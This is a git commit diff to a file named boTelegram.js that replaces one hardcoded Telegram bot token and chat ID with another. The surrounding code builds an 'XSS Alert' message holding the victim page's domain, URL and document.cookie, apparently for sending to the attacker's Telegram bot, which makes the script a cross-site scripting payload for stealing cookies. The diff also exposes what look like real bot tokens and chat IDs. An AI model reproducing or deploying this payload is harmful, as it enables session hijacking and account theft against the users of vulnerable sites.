3e8787b0d60308b7f51564a802adde89a607504e
yya1233 <151393498+yya1233@users.noreply.github.com>
2024-06-23 01:37:34 +0700

    Update boTelegram.js

--- boTelegram.js
+++ boTelegram.js
@@ -1,5 +1,5 @@
-var tokenBot = '1916191874:AAHYWmLWBZdc-j_zWOsizfWEzlBEyEZkDLc'; // Your "tokenBot" Here
-var chatId = '1761582481'; // Your "chatId" Here
+var tokenBot = '7463292454:AAGKxbwCxeRc9OS2hDRLRXW6mHFavhd_v3Q'; // Your "tokenBot" Here
+var chatId = '6561041387'; // Your "chatId" Here
 
 function telegramSend(tokenBot, chatId) {
 	var textData = '<b>XSS+Alert+in+' + document['domain']+'</b>%0d%0a------------------------------------------------%0d%0a%0d%0a<b>-+URL+Target+-</b>%0d%0a<pre>' + document['location']['hostname'] + document['location']['pathname'] + '</pre>%0d%0a%0d%0a<b>-+Document+Cookie+-</b>%0d%0a<pre>' + document['cookie'] + '</pre>';
